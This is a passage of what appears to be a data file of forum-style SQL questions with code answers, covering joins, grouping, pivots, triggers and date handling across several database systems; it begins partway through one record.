    COALESCE([Status Today], [Status 15 days ago], [Status 30 days ago], [Status 45 days ago]) [Status Today],
    COALESCE([Status 15 days ago], [Status 30 days ago], [Status 45 days ago], [Status Today]) [Status 15 days ago],
    COALESCE([Status 30 days ago], [Status 45 days ago], [Status 15 days ago], [Status Today]) [Status 30 days ago],
    COALESCE([Status 45 days ago], [Status 30 days ago], [Status 15 days ago], [Status Today] ) [Status 45 days ago]
FROM 
    statusCte
"
17460,12311,MySQL finding unique product ids from 2 tables,"SELECT COUNT(1) 
FROM (SELECT distinct ProductId
      from Sales
     UNION -- instead of union all to ensure that only distinct values are taken
      SELECT distinct ProductId
      from Links) products
"
8241,72848,Adding non existing data to SQL query,"select t1.x, t2.y, s.count from 
(values(1),(2),(3),(4),(5)) t1(x) cross join
(values(1),(2),(3),(4),(5)) t2(y)  
left join #temp s on t1.x = s.x and t2.y = s.y
"
21431,3105,SQL Junction Query - How To Get Exact Match,"SELECT F.fruitName 
FROM tblFruits as F INNER JOIN
     tblFruitTagJunc AS FTJ
     on F.fruitID = FTJ.fruitID INNER JOIN
     tbltag as T
     ON FTJ.tagID = T.tagID
GROUP BY F.fruitName
HAVING SUM(iif(t.tag in ('Orange'), 1, 0) > 0 AND
       COUNT(t.tag) = 1;
"
21638,27786,SQL Server : Any or IN,"SELECT ArtistName
FROM Artist a
INNER JOIN GenreArtistLink gal
ON gal.ArtistId = a.ArtistId
INNER JOIN Genre g
ON g.GenreId = gal.GenreId
AND g.GenreName IN(SELECT M.c.value('./@name', 'varchar(255)')
                   FROM @SomeXml.nodes('/Genres/Genre') M(c))
GROUP BY artistname
HAVING COUNT(*) = (SELECT COUNT(M.c.value('./@name', 'varchar(255)')) 
                   FROM @SomeXml.nodes('/Genres/Genre') M(c))
"
34203,16234,SQL multiple GROUP BY represented in a single row,"SELECT  COUNT(*) AS Total,
        COUNT(CASE WHEN stat = 'P' THEN 1 END) AS CodeP,
        COUNT(CASE WHEN stat = 'R' THEN 1 END) AS CodeR,
        CONVERT(CHAR(5), DateCreated, 10) AS Date
FROM    TrendingData
GROUP BY CONVERT(CHAR(5), DateCreated, 10)
ORDER BY Date; 
"
11528,53319,SELECT and TRUNCATE in Sybase stored procedure,"ALTER PROCEDURE ""RD1DTA"".""my_procedure""()
BEGIN
    SELECT * INTO #XYZ FROM rd1dta.qrtsp
    TRUNCATE TABLE rd1dta.qrtsp
    SELECT * FROM #XYZ
END
"
27145,38608,using subquery instead of the tablename,"FOR i IN (SELECT tab_name
            FROM META m
           WHERE m.type = ?) LOOP
  EXECUTE IMMEDIATE 'SELECT * FROM '|| i.tab_name ||'';
END LOOP;
"
22467,22901,Set primary key with two integers,"INSERT INTO your_table
  (COLUMN_A, COLUMN_B)
VALUES(GREATEST(@param_a, @param_b), 
       LEAST(@param_a, @param_b))
"
29021,44396,Update data and relationships in Access table from Excel data,"Dim strSQL  As String
strSQL = ""delete * from T3;""     ' Delete all existing rows
CurrentDb.Execute strSQL
strSQL = ""delete * from T2;""
CurrentDb.Execute strSQL
strSQL = ""delete * from T1;""
CurrentDb.Execute strSQL

' Insert new rows from imported tables.
strSQL = ""INSERT INTO T1 SELECT Import1.* FROM Import1;
CurrentDb.Execute strSQL
strSQL = ""INSERT INTO T2 SELECT Import2.* FROM Import2;
CurrentDb.Execute strSQL
strSQL = ""INSERT INTO T3 SELECT Import3.* FROM Import3;
CurrentDb.Execute strSQL
"
25229,43620,SQL Query for all purchases in a given month,"SELECT id, LastName, firstname FROM Customers
WHERE EXISTS ( SELECT 1 FROM Purchases 
               WHERE customers_id=Customers.id
               AND MONTH(purchasedate)=2 AND YEAR(purchasedate)=2016 )
"
30919,33813,Parse XML string stored on Oracle Table,"SELECT
  extractvalue(xmlcol, '/*/TextBox[@Name=''txtAddress11'']') txtaddress
FROM yourtable
"
17477,67895,Making a sha1-hash of a row in Oracle,"DECLARE
   x RAW(20);
BEGIN
   SELECT sys.dbms_crypto.hash(col1||col2||to_char(col3), 
                               sys.dbms_crypto.hash_sh1) 
     INTO x 
     FROM t;
END;
"
23889,9792,The most efficient way to UPPER CASE two columns in a single query,"update yourtable set columna=upper(columna), columnb=upper(columnb)
"
4788,19301,Need to find no of nth occurenece of the day from date in sql,"DECLARE @date DATETIME;

SET @date = '2013-08-30'
select 
case when DATEPART(dd,@date)<=7 then '1st '+datename(DW,@date)
when DATEPART(dd,@date)>7 and DATEPART(dd,@date)<=14 then '2nd '+datename(DW,@date)
when DATEPART(dd,@date)>14 and DATEPART(dd,@date)<=21 then '3rd '+datename(DW,@date)
when DATEPART(dd,@date)>21 and DATEPART(dd,@date)<=28 then '4th '+datename(DW,@date)
when DATEPART(dd,@date)>28 and DATEPART(dd,@date)<=31 then '5th '+datename(DW,@date) end
"
22360,607,"Can you define values in a SQL statement that you can join/union, but are not stored in a table outside of the statement?","SELECT *
FROM table1 T1
JOIN (
    SELECT titles, stuff 
    FROM table2
    UNION ALL
    SELECT 'foo' AS titles, 'foostuff' AS stuff
    UNION ALL
    SELECT 'bar' AS titles, 'barstuff' AS stuff
) T2
ON T1.id = T2.titles
"
15361,69624,SQL - Nearest record within the same group,"update t
    set ParentId = (select top 1 id
                    from table t2
                    where t2.""type"" = 'x' and
                          t2.""group"" = t.""group""
                          t2.location between t.location - 5 and t.location
                    order by location
                   )
    from table t
    where ""type"" = 'y';
"
21076,65793,sql and null values,"where col1 = col2
or (col1 is null and col2 is null)
"
6868,11959,How to format Time Stored in DB2 as hhmmss,"SELECT TIME(SUBSTR(RIGHT('0' || fieldTME, 6), 1, 2) || ':' ||
            SUBSTR(RIGHT(fieldTME, 4), 1, 2) || ':' ||
            RIGHT(fieldTME, 2)) AS resultTime  
FROM Tbl1         
"
3074,37696,SQL Server: Correct Estimation of Rows from String Split Function,"Begin
    create table #split (data varchar(255) primary key);

    insert into #split(data)
        select data
        from dbo.fn_Split(@parameters, ',');

    SELECT *
    FROM TableA LEFT JOIN
         Table B
         on B.ID = A.FID
    WHERE B.ID IN (SELECT Data FROM #split);

END;
"
20849,38414,Oracle PL/SQL Trigger to only run if changes made to data after 9-5 hours,"IF( to_number( to_char(sysdate, 'hh24')) >= 17 or
    to_number( to_char(sysdate, 'hh24')) < 7 )
THEN
  INSERT INTO employee_history...
END IF;
"
32265,21815,insert Single Quotation Marks in sql,"'exec ee_Report.dbo.FTX_FA_Aging_Report_sp ''FACloedAgingReportSee'''
"
38530,48000,Laravel. seeding large sql file,"exec(""mysql -u "".\Config::get('database.mysql.user')."" -p"".\Config::get('database.mysql.password')."" "".\Config::get('database.mysql.database')."" < script.sql"")
"
36482,42632,Replacing characters in a string based on rows in a table sql,"declare @s varchar(50)= 'Hell0 c@t$'
select @s = REPLACE(@s, CharacterToFilter, ReplacementCharacter) 
    from CharacterMappings
select @s
"
21635,46113,SQL Server- update values from one column in same table to another,"select * from stuff

update stuff
set TYPE1 = TYPE2
where TYPE1 is null;

update stuff
set TYPE1 = TYPE2
where TYPE1 ='Blank';

select * from stuff
"
2441,4700,string search in MySQL Query,"SELECT *
  FROM table1
 WHERE skills LIKE '%mysql%' 
    OR skills LIKE '%c%'
"
2472,72071,Access query for deleting repeats in next months,"DELETE  yt1
FROM    YourTable yt1
WHERE   EXISTS
        (
        SELECT  *
        FROM    YourTable yt2
        WHERE   yt1.ID = yt2.ID AND
                    mid(yt2.TheMonth, 3, 2) + mid(yt2.TheMonth, 1, 2) <
                    mid(yt1.TheMonth, 3, 2) + mid(yt1.TheMonth, 1, 2)
        )
"
35704,38640,SQL call to return count by days of month with multi-day items,"CREATE TABLE Calendar (
    calendar_date DATE NOT NULL,
    CONSTRAINT PK_Calendar PRIMARY KEY CLUSTERED
)

SELECT
    C.calendar_date,
    COUNT(*) AS count
FROM
    favoriteOrgs F
INNER JOIN Event E ON
    E.profile_id = F.profile_id AND
    E.last_date >= '$startDate' AND
    E.start_date <= '$lastDate'
INNER JOIN Organization O ON
    O.id = F.profile_id AND
    O.id = E.profile_id
WHERE
    F.user_id = 200372
GROUP BY
    C.calendar_date
"
38884,7639,Convert decimal number to INT SQL,"select cast(replace('3562.45', '.','') as integer)
"
14588,32275,Selecting rows with repeating values in one column,"SELECT 
    MAX(t1.Id) as ID, 
    t1.code, 
    t1.sequence_number
FROM mytest t1
INNER JOIN mytest t2
ON t1.id <> t2.id
AND t1.code = t2.code
AND t1.sequence_number = t2.sequence_number
GROUP BY t1.code, 
    t1.sequence_number
    ORDER BY ID
"
17783,15247,SQL Trim non-numerics From Varchar Sybase,"declare @val varchar(10)
select @val='50.43 min'
select 
  case
     when PATINDEX('%[a-z]%',col) = 0
       then col
     else rtrim(SUBSTRING(col,1,PATINDEX('%[a-z]%',col)-1))
   end        
from
 ( select SUBSTRING(@val,PATINDEX('%[0-9]%',@val),PATINDEX('%[0-9]%',@val)
   +len(@val)+1) as col ) t
"
17768,72149,SQL Select Data from Three Tables,"SELECT a.ID AS AreaID, a.Area AS AreaName, 
       s.ID AS SiteID, s.Site AS SiteName, 
       l.ID AS LocationID, l.Location AS LocationName
FROM Area a
     LEFT JOIN Site s ON s.AreaID = a.ID
     LEFT JOIN Location l ON l.AreaID = a.ID
"
11239,60047,Simple MySQL Query returning invalid result,"SELECT * FROM product
WHERE  name LIKE '%test%'  AND  
        price BETWEEN 160 AND 200
LIMIT 50
"
33567,4784,Finding duplicate rows from Access SQL Table,"SELECT INGREDIENT
FROM   POTION_INGREDIENTS
WHERE  POTION_CODE IN ('C1','C2')
GROUP  BY Ingredient
HAVING COUNT(INGREDIENT) > 1
"
30203,7599,Cast/Convert Text-Decimal,"DECLARE @T01 TABLE([2 37] text, [2 37 Floor] int, [2 37 Ceiling] int)
INSERT @T01 ([2 37]) VALUES('1.5')
INSERT @T01 ([2 37]) VALUES('4.1')
INSERT @T01 ([2 37]) VALUES('5.9')

update t
set [2 37 Floor]=floor(CONVERT(decimal(8,2),(CAST([2 37] AS varchar(10))))  )
,  [2 37 Ceiling] =ceiling(CONVERT(decimal(8,2),(CAST([2 37] AS varchar(10)))))
from @T01 t
WHERE [2 37] LIKE '%.%'
select * from @T01
"
19437,67394,SELECT all items in common between two users from a SINGLE TABLE,"SELECT Item_ID
FROM xyz
WHERE  User_ID IN ('A','B')
GROUP BY Item_ID
HAVING COUNT(distinct user_id) = 2
"
20025,18218,Regex to not apply to start or end of line,"SQL> select str
  2    from (select 'attention' str from dual union all
  3          select 'look at the tent' str from dual union all
  4          select 'tent''s are nice' str from dual union all
  5          select 'something tent something' str from dual union all
  6          select 'camping,tent,outdoors' str from dual)
  7   where REGEXP_LIKE(str, '(\W|^)tent(\W|$)', 'i') ;

STR
------------------------
look at the tent
tent's are nice
something tent something
camping,tent,outdoors

SQL> select str,
  2         case when REGEXP_LIKE(str, '(\W|^)tent(\W|$)', 'i') then 'YES' else 'NO' end matches
  3    from (select 'attention' str from dual union all
  4          select 'look at the tent' str from dual union all
  5          select 'tent''s are nice' str from dual union all
  6          select 'something tent something' str from dual union all
  7          select 'tent' str from dual union all
  8          select 'camping,tent,outdoors' str from dual);

STR                      MAT
------------------------ ---
attention                NO
look at the tent         YES
tent's are nice          YES
something tent something YES
tent                     YES
camping,tent,outdoors    YES
"
10193,2806,Mysql insert random datetime in a given datetime range,"INSERT INTO `sometable` VALUES(
    FROM_UNIXTIME(
        UNIX_TIMESTAMP('2010-04-30 14:53:27') + FLOOR(0 + (RAND() * 63072000))
    )
)
"
39032,65663,how to calculate sum of hours?,"select worker_id,
       sum(hrs)
  from (select worker_id, 
               (to_date(hr_stop, 'hh24:mi:ss') - to_date(hr_start, 'hh24:mi:ss')) * 24 hrs
          from days d,
               hours h
         where d.id = h.day_id
           and trunc(event_date, 'mm') = trunc(sysdate, 'mm')
       )
group by worker_id
"
34310,48723,Lookup table for oracle decodes?,"select nvl((select state_desc from lookup where state_num=state),to_char(state)) from states_table
"
11378,23979,Simple SQL Search within a string,"select * from [table] where [column] like '%LMY%' and [column] like '%RET%'
"
21714,46208,Let Oracle delete parent row,"CREATE OR REPLACE TRIGGER remove_parent2_row
  BEFORE DELETE ON child
  FOR EACH ROW
BEGIN
  DELETE FROM parent2 p
   WHERE p.id = :old.parent2_id;
END;
"
29076,54557,"SQL, Group by one colum","Select id, version, sequence
From DataTable dt
where version =
    (Select Max(version)
     From DataTable 
     where Sequence = dt.Sequence)
"
37515,8499,SQL joins and group by with 3 separate tables,"SELECT DISTINCT Items.[Item Description], 
       ItemQuantities.[QTY Available],
       Items.[Selling U Of M], 
       Items.[Item Number], 
       V.VNAME
FROM ItemQuantities 
   INNER JOIN Items ON ItemQuantities.[Item Number] = Items.[Item Number] 
   INNER JOIN Vendors ON 
       RIGHT(Items.[Item Number], 3) = LEFT(Vendors.[Vendor ID], 3)
WHERE Items.[Item Number] LIKE 'WH%'
       AND Items.[Item Number] NOT LIKE '%RMW'
"
10279,48777,how can i retrieve same column with two different alias?,"select group_concat(case when rank > 0 then answer end) as pos_answers,
       group_concat(case when rank < 0 then answer end) as neg_answers
from answers
"
24635,49269,sql copy specific columns from one table to another table,"INSERT INTO TestDB.dbo.Codes(Col1,Col2,Col3,....)
SELECT 33,col1,col2.... FROM DevDB.dbo.tblCode where ParentCodeID = xx
"
12655,60881,Case to check if previous record matches last record,"SELECT oid, machine, starttime, endtime, delayname, 
       CASE WHEN starttime = 
                 LAG (starttime) OVER (PARTITION BY machine ORDER BY starttime) 
            THEN 1 
            ELSE 0 
       END AS flag
FROM   my_table
"
11833,25958,Inserting into table the values returned from stored procedure," declare @t results (field1 int, ....)

 insert @t (field1,...)
 exec pr_test 
"
20366,11739,getting last record from the database with some conditions,"SELECT  *
FROM    (
        SELECT  *,
                ROW_NUMBER() OVER (PARTITION BY mobileNumber ORDER BY year DESC, month DESC, recordId DESC) rn
        FROM    mytable
        ) q
WHERE   rn = 1
"
21464,71301,MySQL: fixing data using other table," update tag  inner join tag2
 on tag.id = tag2.id     
 set tag.name = tag2.name
"
38540,58200,oracle 11g SQL :help for a complicated sql query,"select acc_num, 
max(decode(open,1,date)) open_date,
max(decode(close,1,date)) close_date,
max(decode(activate,1,date)) activate_date
from table
group by acc_num
"
17702,75433,SQL Server 2005: Select statement in ISNULL condition,"Declare @list varchar(100), @Col2 varchar(100)

SELECT  *
  FROM  Table1 t1
INNER JOIN dbo.Table2 t2
on t1.Col1 = t2.Col1

where t1.Col2 = ISNULL(@Col2,t1.Col2)
AND (@list IS NULL OR  t1.Col3 IN (select * from dbo.SplitMe(@list)))
"
33663,43103,Only transfer rows Order Lines with matching Order Header,"insert into dbNew.dbo.OrderLines (columns)
select columns
from dbOld.dbo.OrderLines old_lines
where exists (
    select null
    from dbNew.dbo.OrderHeader h
    where old_lines.OrderID = h.OrderID
)
"
26870,39482,Oracle Divisor is equal to zero,"select thedate, (case when denom <> 0 then round(100*num/denom) end)
from (SELECT thedate,
             SUM( case when TRUNC(ACTIVITY_END_DATE) <= thedate
                            AND TRUNC(ACTIVITY_END_DATE) >= add_months( trunc(thedate,'mm'), -12) 
                            AND trunc(ACTIVITY_END_DATE) <= trunc(ACTIVITY_NEED_DATE) 
                            AND SYSDATE  >=  trunc(thedate,'mm') then 1 else 0
                  end )   as num,
             SUM( case when TRUNC(ACTIVITY_END_DATE) <= thedate 
                        AND TRUNC(ACTIVITY_END_DATE) >= add_months( trunc(thedate,'mm'), -12) 
                        AND SYSDATE  >=  trunc(thedate,'mm') then 1 else 0 end ) ) as OTR12 
        FROM TEST cross join
             (  select add_months(last_day(SYSDATE), level-7) as thedate 
                from dual connect by level <= 12  )  
        GROUP BY thedate 
     ) t
order by thedate
"
30957,33147,How to retrieve a value or null without duplicates when joining three tables?,"WITH [CTE] AS (
SELECT
        pc.PersonId
    ,   pc.ContactValue
    ,   RANK() OVER (PARTITION BY PersonId ORDER BY ContactValue DESC) AS [Seed]
FROM
    PeopleContacts pc
    INNER JOIN  Contacts c ON (pc.ContactId = c.ContactId AND c.ContactType='HOME')
    WHERE pc.StartValidDate <= GETDATE()
    AND (pc.EndValidDate > GETDATE() OR pc.EndValidDate IS NULL)
)

SELECT      FullName
        ,   ISNULL(CTE.ContactValue, '') 
FROM People p
LEFT OUTER JOIN CTE ON (CTE.PersonId = p.PersonID AND CTE.Seed = 1)
"
31637,64334,"SQL Anywhere (12) - Left Join, not distinct/unique enough?","SELECT
  P.label,
  P.creationclass,
  P.attributes,
  P.type,
  P.uniqueid,
  C.label,
  C.idx,
  C.PID,
  C.creationclass,
  C.attributes,
  C.type,
  C.uniqueid
FROM
  t_equip_template AS P
  LEFT JOIN t_equip_template AS C
    ON P.ID = C.PID
WHERE
  P.type = '1003'
  AND NOT EXISTS (
    SELECT 1 FROM
      t_equip_template AS C2
    WHERE
      P.ID = C2.PID
      AND (C2.creationclass LIKE x
           OR C2.creationclass LIKE y
           OR C2.creationclass LIKE z)
  )
"
11025,7515,Can't get all data from table with laravel raw query and group_concat,"        ->groupBy('classreports.teacherId','classreports.reportDate')
"
34868,56154,Hibernate HQL query with condition on second table,"select l, t from League l left join l.teams t on t.name like :name order by l.id
"
22857,47205,How to select numbers with precision in Oracle,"select to_char( <<the number>>, '0D99' )
  from <<your table>>
"
6641,35523,How do I get the last three digits of a varying length column?,"SELECT RIGHT(CONVERT(VARCHAR(4000), [hypothetical column]), 3) FROM table;
"
27639,71435,SQL: Select rows with a column value that occurs at least N times?,"SELECT fname, lname FROM Celebrities 
WHERE lname IN 
 (SELECT lname FROM Celebrities 
  GROUP BY lname HAVING COUNT (lname) >1)
"
3988,42970,Atomically mark and return a group of rows in database,"WITH cte AS (
  SELECT TOP(20) status, id, ...
  FROM table WITH (ROWLOCK, READPAST, UPDLOCK)
  WHERE status = 'new'
  ORDER BY enqueue_time)
UPDATE cte
  SET status = 'processing'
OUTPUT
  INSERTED.id, ...
"
39316,66976,SQL Server ORDER BY when using DATENAME function,"With CTE as (
SELECT CAST(DATEPART(yyyy,DATE1) 
AS varchar (5)) + '-' + CAST(DATENAME(m,ec2.DATE2) 
AS varchar(3)) AS [Month],
CAST(AVG(CAST(DATEDIFF(day,DATE1, DATE2) 
AS DECIMAL(10,2))) AS DECIMAL(10,2)) AS tt
FROM tbl3
GROUP BY CAST(DATEPART(yyyy,DATE1) AS 
varchar (5)) + '-' + CAST(DATENAME(m,ec2.DATE2) 
AS varchar(3))
Select * from CTE
ORDER BY 
DATEPART(yyyy, cast([Month] as datetime)),
DATEPART(mm, cast([Month] as datetime));
"
20183,67463,Ignore case in ORDER BY in mysql,"SELECT *
FROM   tableName
ORDER  BY columnName ASC
"
24893,24979,How to approach the following query in oracle,"select last_trans_date,
       CASE
         WHEN last_trans_date < sysdate-180 THEN 'YES'
         ELSE 'NO'
       END as ""a"",
       CASE
         WHEN last_trans_date < sysdate-360 THEN 'YES'
         ELSE 'NO'
       END as ""b""
  from x;
"
4046,72024,Trigger that checks if the same tuple exists in two different tables,"CREATE OR REPLACE TRIGGER test_test_CHECK_tuple
BEFORE INSERT ON tableB
FOR EACH ROW
declare
  v_cnt number(10);
BEGIN
    SELECT count(*)
    into v_cnt
    FROM tableA
    where column1=:new.column1
    and  column2=:new.column2;

  if v_cnt= 0 then
    raise_application_error(-20101, 'ERROR.');
  end if;
END;
"
6791,57097,How to use my horizontal query result to another SQL query,"SELECT t1.ARID, t1.SEQ1 AS SEQN
FROM Tab1 t1 INNER JOIN Tab2 t2 ON t1.ARID = t2.ARID
WHERE t1.ARID = 'ar01'
  AND t1.SEQN = t2.SEQ1

UNION ALL

SELECT t1.ARID, t1.SEQ2 AS SEQN
FROM Tab1 t1 INNER JOIN Tab2 t2 ON t1.ARID = t2.ARID
WHERE t1.ARID = 'ar01'
  AND t1.SEQN = t2.SEQ2

UNION ALL

SELECT t1.ARID, t1.SEQ3 AS SEQN
FROM Tab1 t1 INNER JOIN Tab2 t2 ON t1.ARID = t2.ARID
WHERE t1.ARID='ar01'
  AND t1.SEQN = t2.SEQ3

UNION ALL

SELECT t1.ARID, t1.SEQ4 AS SEQN
FROM Tab1 t1 INNER JOIN Tab2 t2 ON t1.ARID = t2.ARID
WHERE t1.ARID='ar01'
  AND OR t1.SEQN = t2.SEQ4
"
3607,233,Comparing tables in SQL?,"    SELECT DISTINCT Table1.col1, Table1.col2 ,Table2.col1 as col3 ,Table2.col2 as col4 
    FROM Table1
    LEFT JOIN 
    Table2
    ON Table1.col1 = Table2.col1
    and Table1.col2 = Table2.col2
"
30924,22848,MySQL - Get Distinct Primary Col Table Row Order By Foreign Key Table,"SELECT c.ContactID, c.Name, m.Text, m.Messagetime
FROM Contacts c INNER JOIN
     Messages m
     ON c.ContactID = m.ContactID
WHERE NOT EXISTS (select 1
                  from messages m2
                  where m2.ContactId = m.ContactId and
                        m2.MessageTime > m.MessageTime
                 )
ORDER BY m.MessageTime desc;
"
3953,40008,sqlplus set command when using oracle sequence,"select to_char(test_seq.nextval) as my_val from dual;
"
10832,3733,How to compare two columns in SQL server,"SELECT CASE WHEN REPLACE (Table1.ColName1,'.','') = Table2.ColName2 
            THEN 'Equal' 
            ELSE 'Not Equal' 
            END AS IsEqual
    FROM Table1
    INNER JOIN Table2 ON Table1.PrimaryKey = Table2.ForeignKey
"
34283,47993,How can I count the number of instances of this character at the end of a string in SQL or PL/SQL?,"select length(some_column) - length(replace(some_column, '=', ''))
from your_table
"
6451,25292,How do I put multiple criteria for a column in a where clause?,"SELECT * 
FROM TABLE 
WHERE ID IN (SELECT ID FROM TALBE2)
"
14893,19251,Retrieving monthly data for different types,"SELECT 
SUM(CASE WHEN e.dept=012 
    AND Hiredate between Start_of_Month() and Getdate() 
    AND... 
    THEN 1 ELSE 0 END) AS 'MtdHiresSales',
...
FROM ...
WHERE ...
"
36478,74240,Mondial DB Inner Query,"SELECT 
    Country.Name, City.CityName, City.Population
FROM
    Country Join City On Country.Code = City.Country
Join (SELECT 
        MAX(Population) AS Population,Country as Country from City Group By Country)  as X
On City.Country = x.Country and City.Population = x.Population
"
22213,15278,"select same data from two columns in a table, and using one sql statement to show all data","select * from em where (birth, high) in (('11/23','65'),('05/16','50'));
"
34821,18026,How to get a distinct number of IDs when they can be associated with different tables?,"select coalesce(m.customerid, c.customerid, t.customerid) as customerid, count(*) as cnt
from Messages m left outer join
     Cars c
     on m.carid = c.carid left outer join
     Trucks t
     on m.truckid = t.truckid
group by coalesce(m.customerid, c.customerid, t.customerid);
"
37000,38724,Getting the max value and the month and hour it occurred in access,"select A.clientid, A.clientname, A.power, A.date, A.hour
from tabledata A
JOIN
(
    SELECT clientid, max([power]) as max_power
    from tabledata
    group by ClientID
) as B on A.ClientID = b.ClientID and A.[power] = B.max_power
"
32713,14181,SQL - Get the latest event from table,"SELECT  t_d.*, t_e.*
FROM    dealer as t_d 
        INNER JOIN events AS t_e
            ON t_d.id = t_e.did
        INNER JOIN
        (
            SELECT  did, MAX(date) maxDate
            FROM    events
            GROUP BY did
        ) e ON  t_e.did = e.did AND
                t_e.date = e.maxDate
"
24795,37532,Self-Join ... new synthetic columns for values in existing column,"SELECT Uuid, 
   CASE WHEN U.ValueA>0 THEN 'OK' ELSE 'Missing' END AS ValueA,
   CASE WHEN U.ValueB>0 THEN 'OK' ELSE 'Missing' END AS ValueB
FROM 
 (SELECT T.Uuid, 
     (SELECT COUNT(*) FROM MyTable AS M WHERE T.Uuid=M.UserID AND ValueField='ValueA') AS ValueA, 
     (SELECT COUNT(*) FROM MyTable AS M WHERE T.Uuid=M.UserID AND ValueField='ValueB') AS ValueB
  FROM (SELECT DISTINCT Uuid FROM MyTable) AS T
  GROUP BY Uuid) AS U
ORDER BY Uuid
"
15824,35985,Sum with expression and group by in Access 2007 / VBA,"UPDATE mt
SET rc='DAR'
WHERE  Account IN
(
  SELECT mt.account
  FROM 
    (
    SELECT mt.Account, SUM(mt.[amount]+Nz(mt.[SFS],0)) as total
    FROM mt
    GROUP BY mt.Account
    )    
  WHERE total>=500
);
"
30206,71947,Insert from Select except specific column(s) in Oracle,"insert into yourTable (col1, col2, col3)
select col1, col2, 'diffValue'
  from someTable
 where SomePK = SomeVal;
"
6530,30256,Using Dates in SQL Server 2012 Query,"WHERE CreatedOn >= '2014-08-19'
"
32238,51251,SQL Query to get the Max Date of a certain Status and subract that from the Max Date of another Status,"SELECT
    t.id
    ,DATEDIFF(second, start_time, stop_time) elapsed_sec
FROM (
    SELECT
        ID,
        (SELECT MAX(update_date) from xxx.dbo WHERE status = 'New' AND ID=t2.ID) start_time,
        (SELECT MAX(update_date) from xxx.dbo WHERE status = 'Completed' AND ID=t2.ID) stop_time
    FROM xxx.dbo t2
) t
"
3046,10731,Linq equivalent of sql statement from one table but including counts based on groups within that table,"from mat in materials 
order by mat.mainType, mat.subType
select new with {
    mat.Id,
    mat.MaterialName,
    mat.MainType,
    mat.SubType,
    .countMain = (Aggregate m2 in materials
                    where m2.MainType=mat.MainType
                    into Count()),
    .countSub = (Aggregate m2 in materials
                    where m2.SubType=mat.SubType
                    into Count())
}
"
3069,48205,MySQL Substring with WHERE,"SELECT users.id, SUBSTRING(posts.datestr, 4, 8) as shortdate 
FROM users, posts 
HAVING shortdata='Jan-2014'
"
11540,16108,Similar queries have way different execution times,"SELECT nvl(sum(adjust1),0)
FROM (
  SELECT
    ManyOperationsOnFieldX adjust1
  FROM (
    SELECT
      SubStr(balance, INSTR(balance, '[&&2~', 1, 1)) X
    FROM
      table
    WHERE
      a >= To_Date('&&1','YYYYMMDD')
      AND a < To_Date('&&1','YYYYMMDD')+1
      AND (
          b LIKE '..'
          AND e IS NULL
          AND (b NOT IN ('..','..','..'))
          OR  (b='..' AND c <> NULL)
      )
  )
)
WHERE
  adjust1>0
"
22674,70614,Insert into - SQL Server query," select * into [dbo].[dest]
 from OPENQUERY(LINKEDSERVER,'select * from source')
"
12215,7880,How do execute a .sql script from bash,"mysql -u user -p < db.sql
"
9263,67864,Classic ASP & sqlstatement : How to update 2 and more Master & detail records with Classic ASP?,"UPDATE PurchaseOrder SET Status = 1 
FROM PurchaseOrder PO 
INNER JOIN Invoice I On PO.Quantity = I.Quantity AND PO.Amount = I.Amount
"
37854,41182,Get daily sales from a database,"SELECT   DATE(o.date_purchased)  AS date_purchased,
         ROUND(SUM(ot.value), 2) AS sales_per_day,
         COUNT(*) AS orders_today
FROM     orders AS o
JOIN     orders_total AS ot ON ot.orders_id = o.orders_id
WHERE    ot.class = 'ot_total'
AND      o.date_purchased >= LAST_DAY(NOW() - INTERVAL 1 MONTH) + INTERVAL 1 DAY
AND      o.date_purchased <= LAST_DAY(NOW())
GROUP BY DATE(o.date_purchased) 
"
11591,31102,SQL and Normalization,"Tbl_Break:
    id_Break (primary key)
    id_Employee (not null)
    breakStartTime (not null)
    breakEndTime (not null)        
    id_StandardBreak (nullable)

Tbl_StandardBreak:
    id_StandardBreak (primary key)
    standardBreakStartTime (not null)
    standardBreakEndTime (not null)
    standardBreakDescription (not null)
    id_Schedule (not null)
"
7149,7003,Return results where a shared value is shared between two tables and the timestamp is different,"SELECT *
FROM Table1 AS a INNER JOIN Table2 AS b
ON a.ValueA = b.ValueA
WHERE a.ValueB > b.ValueB
"
28935,9481,Help with PIVOT,"With Numbered as
(
select *, ROW_NUMBER() OVER (PARTITION BY Name ORDER BY Words) AS RowNum
from yourTable)
select [A],[B],[C]
from Numbered n
pivot (max(Words) for Name in ([A],[B],[C])) p
;
"
27149,57640,SQL Recursive Result to Find All Products within Category Hierarchy,"DECLARE @lowestcategoryid INT;

SET @lowestcategoryid = 3;

--recursive loop
WITH RecursiveResult( id, CategoryName, parentId) AS
(
SELECT ch.Id, ch.categoryname, ch.parentId
FROM CategoryHierarchy ch 
WHERE ch.id = @lowestcategoryid

UNION ALL

SELECT ch.Id, ch.categoryname, ch.parentId
FROM CategoryHierarchy ch 
    JOIN RecursiveResult r 
        ON r.Id = ch.ParentId

)

SELECT * 
FROM recursiveresult r
    JOIN Product p
        ON p.CategoryId = r.Id
"
33974,65754,Transpose rows into columns in SQL,"with sample_data as (select to_date('05/01/2015', 'dd/mm/yyyy') dt, 'Monday' weekday, 'A' code from dual union all
                     select to_date('06/01/2015', 'dd/mm/yyyy') dt, 'Tuesday' weekday, 'A' code from dual union all
                     select to_date('07/01/2015', 'dd/mm/yyyy') dt, 'Wednesday' weekday, 'P' code from dual union all
                     select to_date('08/01/2015', 'dd/mm/yyyy') dt, 'Thursday' weekday, 'A' code from dual union all
                     select to_date('09/01/2015', 'dd/mm/yyyy') dt, 'Friday' weekday, 'P' code from dual union all
                     select to_date('12/01/2015', 'dd/mm/yyyy') dt, 'Monday' weekday, 'P' code from dual union all
                     select to_date('13/01/2015', 'dd/mm/yyyy') dt, 'Tuesday' weekday, 'P' code from dual union all
                     select to_date('14/01/2015', 'dd/mm/yyyy') dt, 'Wednesday' weekday, 'P' code from dual union all
                     select to_date('15/01/2015', 'dd/mm/yyyy') dt, 'Thursday' weekday, 'P' code from dual union all
                     select to_date('16/01/2015', 'dd/mm/yyyy') dt, 'Friday' weekday, 'P' code from dual)
-- end of mimicking your data in a table called sample_data
select *
from   (select trunc(dt, 'iw') week_start_dt,
               weekday,
               code
        from   sample_data) 
pivot  (max(code) for weekday in ('Monday' as monday, 
                                  'Tuesday' as tuesday,
                                  'Wednesday' as wednesday,
                                  'Thursday' as thursday,
                                  'Friday' as friday))
order by week_start_dt;

WEEK_START_DT MONDAY TUESDAY WEDNESDAY THURSDAY FRIDAY
------------- ------ ------- --------- -------- ------
2015/01/05    A      A       P         A        P     
2015/01/12    P      P       P         P        P     
"
20948,55326,T-SQL 2005: Add Date and Time,"DECLARE @Date DATETIME = '2011-1-01 00:00:00.000'
, @Time DATETIME = '1900-01-01 3:31:19.000'

